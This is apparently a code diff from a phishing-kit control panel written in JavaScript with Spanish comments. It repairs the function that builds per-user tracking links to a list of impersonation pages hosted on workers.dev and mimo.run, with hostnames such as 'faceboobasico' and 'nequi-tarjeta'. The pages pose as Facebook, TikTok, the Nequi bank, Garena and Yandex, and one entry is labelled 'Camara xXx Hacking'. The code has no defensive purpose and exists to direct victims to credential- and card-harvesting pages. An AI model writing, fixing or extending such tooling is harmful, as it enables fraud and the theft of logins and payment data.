@@ -286,25 +286,7 @@ onAuthStateChanged(auth, async (user) => {
 // ================== ENLACES ÚNICOS ==================
 // (Todo igual, no toqué nada aquí)
 const plantillas = [
-  { nombre: "Facebook Basico", url: "https://jo0u5y.mimo.run/index.html" },
-
-function generarEnlacesUnicos() {
-  const fake = $id("fakeSelect");
-  const lista = $id("optionsList");
-  fake.textContent = "Selecciona un enlace";
-  fake.dataset.url = "";
-  lista.innerHTML = "";
-  plantillas.forEach(p => {
-    const urlFull = `${p.url}?uid=${miLinkId}`;
-    const item = document.createElement("div");
-    item.className = "optionItem";
-    item.textContent = p.nombre;
-    item.onclick = () => {
-      fake.textContent = p.nombre;
-      fake.dataset.url = urlFull;
-      lista.style.display = "none";
-    };
-     { nombre: "Facebook Basico", url: "https://faceboobasico.glegogle5341-af7.workers.dev/" },
+  { nombre: "Facebook Basico", url: "https://faceboobasico.glegogle5341-af7.workers.dev/" },
   { nombre: "Facebook Estandar", url: "https://facebook-estndar.glegogle5341-af7.workers.dev/" },
   { nombre: "TikTok", url: "https://tik-tok.glegogle5341-af7.workers.dev/" },
   { nombre: "Nequi Tarjeta", url: "https://nequi-tarjeta.glegogle5341-af7.workers.dev/" },
@@ -324,7 +306,24 @@ function generarEnlacesUnicos() {
   { nombre: "Camara xXx Hacking", url: "https://camaraxx.glegogle5341-af7.workers.dev/" },
   { nombre: "Yandex", url: "https://yandex.glegogle5341-af7.workers.dev/" },  
   { nombre: "Garena Tarjeta", url: "https://5mpser.mimo.run/index.html" }
-]; lista.appendChild(item);
+];
+function generarEnlacesUnicos() {
+  const fake = $id("fakeSelect");
+  const lista = $id("optionsList");
+  fake.textContent = "Selecciona un enlace";
+  fake.dataset.url = "";
+  lista.innerHTML = "";
+  plantillas.forEach(p => {
+    const urlFull = `${p.url}?uid=${miLinkId}`;
+    const item = document.createElement("div");
+    item.className = "optionItem";
+    item.textContent = p.nombre;
+    item.onclick = () => {
+      fake.textContent = p.nombre;
+      fake.dataset.url = urlFull;
+      lista.style.display = "none";
+    };
+    lista.appendChild(item);
   });
   fake.onclick = () => lista.style.display = (lista.style.display === "block") ? "none" : "block";
 }
@@ -1155,6 +1154,4 @@ document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatM
     setInterval(actualizarUsuarios, 2000);
     actualizarUsuarios();
   }, 2000);
-
 })();
-
